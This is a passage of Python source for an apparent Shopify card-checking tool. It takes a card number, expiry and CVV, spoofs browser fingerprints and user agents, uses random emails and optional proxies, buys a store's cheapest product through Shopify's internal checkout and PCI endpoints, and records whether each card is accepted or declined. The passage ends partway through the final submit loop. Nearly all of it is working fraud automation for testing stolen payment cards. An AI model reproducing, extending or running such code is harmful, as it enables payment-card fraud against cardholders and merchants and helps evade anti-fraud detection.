# ──────────────────────── Payload helpers ────────────────────────────

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency != "USD":
        payload = payload.replace('"currencyCode": "USD"',        f'"currencyCode": "{currency}"')
        payload = payload.replace('"presentmentCurrency": "USD"', f'"presentmentCurrency": "{currency}"')
    if country != "US":
        payload = payload.replace(
            '"presentmentCurrency": "USD",\n      "countryCode": "US"',
            f'"presentmentCurrency": "USD",\n      "countryCode": "{country}"'
        )
        payload = payload.replace('"phoneCountryCode": "US"', f'"phoneCountryCode": "{country}"')
    return payload

def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"

def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"

# ──────────────────────── Step 9: PCI tokenisation ───────────────────

def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "",
                     vault_url: str = "", vault_domain: str = "") -> Tuple[int, str]:

    _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
    endpoint     = vault_url or _DEFAULT_VAULT
    scope        = vault_domain or shop_domain
    origin_base  = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint else "https://checkout.pci.shopifyinc.com"

    payload = json.dumps({
        "credit_card": {
            "number":             card_number,
            "month":              card_month,
            "year":               card_year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": scope,
    })

    headers = {
        "accept":               "application/json",
        "accept-language":      "en-US,en;q=0.9",
        "content-type":         "application/json",
        "origin":               origin_base,
        "priority":             "u=1, i",
        "referer":              f"{origin_base}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-ch-ua":            '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":     "?0",
        "sec-ch-ua-platform":   '"Windows"',
        "sec-fetch-dest":       "empty",
        "sec-fetch-mode":       "cors",
        "sec-fetch-site":       "same-origin",
        "sec-fetch-storage-access": "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }

    with Session(impersonate="chrome124") as session:
        post_kwargs = {"data": payload, "headers": headers, "timeout": 30}
        if proxy_url:
            post_kwargs["proxy"] = proxy_url
        resp = session.post(endpoint, **post_kwargs)
    return resp.status_code, resp.text

# ──────────────────────── Proposal helpers ───────────────────────────

def _proposal_headers(shop_url: str, checkout_url: str, checkout_token: str,
                      session_token: str, build_id: str, source_token: str) -> Dict:
    return {
        "accept":                        "application/json",
        "accept-language":               "en-US",
        "content-type":                  "application/json",
        "origin":                        shop_url,
        "priority":                      "u=1, i",
        "referer":                       checkout_url,
        "sec-ch-ua":                     '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile":              "?0",
        "sec-ch-ua-platform":            '"Windows"',
        "sec-fetch-dest":                "empty",
        "sec-fetch-mode":                "cors",
        "sec-fetch-site":                "same-origin",
        "shopify-checkout-client":       "checkout-web/1.0",
        "shopify-checkout-source":       f'id="{checkout_token}", type="cn"',
        "user-agent":                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
        "x-checkout-one-session-token":  session_token,
        "x-checkout-web-build-id":       build_id,
        "x-checkout-web-deploy-stage":   "production",
        "x-checkout-web-server-handling":"fast",
        "x-checkout-web-server-rendering":"yes",
        "x-checkout-web-source-id":      source_token,
    }

# ──────────────────────── Step 4: Proposal 1 ─────────────────────────

def send_proposal(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                  session_token: str, stable_id: str, variant_id: str, price: str,
                  proposal_id: str, build_id: str, source_token: str,
                  currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": null,
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 5: Proposal 2 (email) ─────────────────

def send_proposal2(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "", "city": "", "countryCode": "US",
            "lastName": "", "phone": "", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{"address1": "", "city": "", "countryCode": "US", "lastName": "", "phone": ""}}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": true,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 6: Proposal 3 (address) ───────────────

def send_proposal3(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                   session_token: str, stable_id: str, variant_id: str, price: str,
                   proposal_id: str, build_id: str, source_token: str, queue_token: str,
                   email: str, addr: Address, currency: str, country: str) -> Tuple[int, str]:

    gql_payload = f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": "{queue_token}",
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}",
            "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}",
          "address2": "{addr.address2}",
          "city": "{addr.city}",
          "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}",
          "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}",
          "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      "email": "{email}",
      "emailChanged": false,
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Step 10: SubmitForCompletion ───────────────

def send_poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                          session_token: str, build_id: str, source_token: str,
                          poll_id: str, receipt_id: str, receipt_session_token: str) -> Tuple[int, str]:

    params   = {
        "operationName": "PollForReceipt",
        "variables":     json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id":            poll_id,
    }
    full_url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"

    headers  = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token

    resp = client.get(full_url, headers=headers)
    return resp.status_code, resp.text


def send_submit_for_completion(client: TLSClient, shop_url: str, checkout_url: str, checkout_token: str,
                               session_token: str, stable_id: str, variant_id: str, price: str,
                               submit_id: str, build_id: str, source_token: str, queue_token: str,
                               email: str, addr: Address, delivery_handle: str, shipping_amount: str,
                               total_amount: str, pci_session_id: str, attempt_token: str,
                               currency: str, country: str, signed_handles: List[str],
                               is_digital: bool = False,
                               item_amount: str = None,
                               tax_amount: str = None) -> Tuple[int, str]:

    handle_lines       = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id            = generate_page_id()

    if is_digital:
        total_amount_block = '"totalAmount": {"any": true}'
    else:
        total_amount_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "{currency}"}}}}'

    if is_digital:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        delivery_block = f'''
      "delivery": {{
        "deliveryLines": [{{
          "destination": {{
            "streetAddress": {{
              "address1": "{addr.address1}",
              "address2": "{addr.address2}",
              "city": "{addr.city}",
              "countryCode": "{addr.country_code}",
              "postalCode": "{addr.postal_code}",
              "firstName": "{addr.first_name}",
              "lastName": "{addr.last_name}",
              "zoneCode": "{addr.zone_code}",
              "phone": "{addr.phone}",
              "oneTimeUse": false
            }}
          }},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyByHandle": {{
              "handle": "{delivery_handle}",
              "customDeliveryRate": false
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false
        }}],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    tax_val   = tax_amount or "0.0"
    tax_block = f'"proposedTotalAmount": {{"value": {{"amount": "{tax_val}", "currencyCode": "{currency}"}}}}'

    gql_payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_amount_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}",
                  "address2": "{addr.address2}",
                  "city": "{addr.city}",
                  "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}",
                  "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}",
                  "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }},
            "giftCardPaymentMethod": null,
            "redeemablePaymentMethod": null,
            "walletPaymentMethod": null,
            "walletsPlatformPaymentMethod": null,
            "localPaymentMethod": null,
            "paymentOnDeliveryMethod": null,
            "paymentOnDeliveryMethod2": null,
            "manualPaymentMethod": null,
            "customPaymentMethod": null,
            "offsitePaymentMethod": null,
            "customOnsitePaymentMethod": null,
            "deferredPaymentMethod": null,
            "customerCreditCardPaymentMethod": null,
            "paypalBillingAgreementPaymentMethod": null,
            "remotePaymentInstrument": null
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "{currency}"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}",
            "address2": "{addr.address2}",
            "city": "{addr.city}",
            "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}",
            "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}",
            "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        {tax_block},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{
      "requestUrl": "{checkout_url}",
      "pageId": "{page_id}"
    }}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''

    gql_payload = patch_payload(gql_payload, currency, country)
    resp = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=gql_payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    )
    return resp.status_code, resp.text

# ──────────────────────── Error checking ─────────────────────────────

def check_proposal_errors(step: str, status: int, body: str):
    if status != 200:
        print(f"  [!] {step}: HTTP {status}")
    matches = re.findall(
        r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
        body)
    if not matches:
        print(f"  [OK] {step}: No errors")
        return
    print(f"  [!] {step}: {len(matches)} error(s):")
    for i, (code, msg) in enumerate(matches):
        print(f"    [{i+1}] {code}" + (f" -- {msg}" if msg else ""))

def check_submit_errors(status: int, body: str):
    if status != 200:
        print(f"  [!] SubmitForCompletion: HTTP {status}")
    match = re.search(r'"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"', body)
    if match:
        print(f"  Result: {match.group(1)}")
        if match.group(1) != "SubmitSuccess":
            for i, (code, msg) in enumerate(re.findall(
                r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"',
                body)):
                print(f"    [{i+1}] {code} -- {msg}")

# ──────────────────────── Orchestrator ───────────────────────────────

def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    """Full Shopify checkout pipeline. Returns a CheckResult."""
    currency  = "USD"
    country   = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")

    result = CheckResult(
        card=card_entry,
        shop_url=shop_url,
        site_name=site_name,
        currency=currency,
        status=CheckStatus.ERROR,
    )

    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result

    _cn = card_number.replace(" ", "").replace("-", "")
    _is_discover = (
        _cn[:4] == "6011" or _cn[:2] == "65"
        or (len(_cn) >= 6 and 622126 <= int(_cn[:6]) <= 622925)
        or (len(_cn) >= 3 and 644 <= int(_cn[:3]) <= 649)
    )
    if _is_discover:
        result.status      = CheckStatus.DECLINED
        result.status_code = "Unsupported card brand: discover"
        result.error       = Exception("Unsupported card brand: discover")
        return result

    email = generate_random_email()
    print(f"  Using email: {email}")

    impersonate = random.choice(BROWSER_PROFILES)
    user_agent  = random.choice(USER_AGENTS)
    print(f"  Browser fingerprint: {impersonate}")

    client = TLSClient(timeout=30, proxy_url=proxy_url,
                       impersonate=impersonate, user_agent=user_agent)

    try:
        # Step 0
        try:
            title, product_id, variant_id, price = find_cheapest_product(client, shop_url)
            print(f"  Found product: {title} - ${price}")
            result.amount = price
            _ = title, product_id
        except Exception as e:
            result.status    = CheckStatus.ERROR
            result.retryable = True
            result.error     = Exception(f"Step 0 failed: {e}")
            return result

        # Step 1
        try:
            checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id    = extract_stable_id(checkout_html)
            build_id     = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not stable_id or not build_id or not source_token:
                raise Exception(f"missing stableId({bool(stable_id)}), buildId({bool(build_id)}), or sourceToken({bool(source_token)})")
        except Exception as e:
            result.status    = CheckStatus.ERROR
            result.retryable = True
            result.error     = Exception(f"Step 1 failed: {e}")
            return result

        # Step 2
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if not pat_id:
                raise Exception("could not extract private_access_token id")
            fetch_private_access_token(client, shop_url, checkout_url, pat_id)
        except Exception as e:
            result.status    = CheckStatus.ERROR
            result.retryable = True
            result.error     = Exception(f"Step 2 failed: {e}")
            return result

        # Step 3
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("could not find actions JS URL")
            js_body     = fetch_actions_js(client, actions_url, shop_url)
            proposal_id = extract_proposal_id(js_body)
            submit_id   = extract_submit_for_completion_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing Proposal or Submit ID")
            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
        except Exception as e:
            result.status    = CheckStatus.ERROR
            result.retryable = True
            result.error     = Exception(f"Step 3 failed: {e}")
            return result

        # Step 4
        try:
            _, proposal_body = send_proposal(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token, currency, country)

            cur = extract_seller_currency(proposal_body)
            if cur and cur != currency:
                currency = cur
            ctr = extract_seller_country(proposal_body)
            if ctr and ctr != country:
                country = ctr
            result.currency = currency

            if currency == "USD":
                seller_price = extract_seller_merchandise_price(proposal_body)
                if seller_price and seller_price != price:
                    price = seller_price

            queue_token = extract_queue_token(proposal_body)
            if not queue_token:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error  = Exception(f"Step 4 failed: {e}")
            return result

        # Step 5
        try:
            _, proposal2_body = send_proposal2(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token, email, currency, country)
            queue_token2 = extract_queue_token(proposal2_body)
            if not queue_token2:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error  = Exception(f"Step 5 failed: {e}")
            return result

        # Step 6
        try:
            addr = address_for_country(country)
            print(f"  Using address: {addr.city}, {addr.country_code}")
            _, proposal3_body = send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token2, email, addr, currency, country)
            queue_token3 = extract_queue_token(proposal3_body)
            if not queue_token3:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error  = Exception(f"Step 6 failed: {e}")
            return result

        # Step 7 (repeat)
        time.sleep(0.05)
        try:
            _, proposal4_body = send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token3, email, addr, currency, country)
            queue_token4 = extract_queue_token(proposal4_body)
            if not queue_token4:
                raise Exception("could not extract queueToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error  = Exception(f"Step 7 failed: {e}")
            return result

        # Step 8
        time.sleep(0.05)
        try:
            proposal5_status, proposal5_body = send_proposal3(
                client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, proposal_id, build_id, source_token,
                queue_token4, email, addr, currency, country)
            _ = proposal5_status
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error  = Exception(f"Step 8 failed: {e}")
            return result

        # Step 9 — PCI
        try:
            ident_sig    = extract_identification_signature(checkout_html)
            vault_url    = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            if not ident_sig:
                raise Exception("could not extract identification signature")
            card_name_str = f"{addr.first_name} {addr.last_name}"
            _, pci_body = send_pci_session(
                ident_sig, card_number, card_name_str,
                card_month, card_year, card_cvv,
                vault_domain, proxy_url,
                vault_url=vault_url, vault_domain=vault_domain)
            pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                _fallback = ("https://checkout.pci.shopifycs.com/sessions"
                             if "shopifyinc" in (vault_url or "")
                             else "https://checkout.pci.shopifyinc.com/sessions")
                _, pci_body = send_pci_session(
                    ident_sig, card_number, card_name_str,
                    card_month, card_year, card_cvv,
                    site_name, proxy_url, vault_url=_fallback)
                pci_session_id = extract_pci_session_id(pci_body)
            if not pci_session_id:
                raise Exception(f"could not extract session ID (body: {pci_body[:120]})")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error  = Exception(f"Step 9 failed: {e}")
            return result

        # Step 10 — submit
        try:
            queue_token5 = extract_queue_token(proposal5_body)
            if not queue_token5:
                raise Exception("could not extract queueToken")

            is_digital = not extract_is_shipping_required(proposal5_body)
            print(f"  Product type: {'DIGITAL' if is_digital else 'PHYSICAL'}")

            delivery_handle = extract_delivery_handle(proposal5_body)
            if not delivery_handle and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract delivery handle")

            signed_handles = extract_signed_handles(proposal5_body)
            if len(signed_handles) == 0 and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract signedHandles")

            shipping_amount = extract_shipping_amount(proposal5_body)
            if not shipping_amount and not is_digital:
                result.retryable = True
                raise Exception("Step 10 failed: could not extract shipping amount")
            if not shipping_amount:
                shipping_amount = "0.00"

            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                total_amount = extract_seller_total(proposal5_body)
            if not total_amount and is_digital:
                total_amount = extract_running_total(proposal5_body)
            if not total_amount:
                raise Exception("Step 10 failed: could not extract total amount")
            result.amount = total_amount

            attempt_token = generate_attempt_token(checkout_token)

            current_tax   = extract_tax_amount(proposal5_body)
            current_total = total_amount

            MAX_TAX_RETRIES = 3
            submit_status = submit_body = None
            for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                submit_status, submit_body = send_submit_for_completion(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token, queue_token5, email,
                    addr, delivery_handle, shipping_amount, current_total,
                    pci_session_id, attempt_token, currency, country, signed_handles,
                    is_digital=is_digital,
                    tax_amount=current_tax
                )

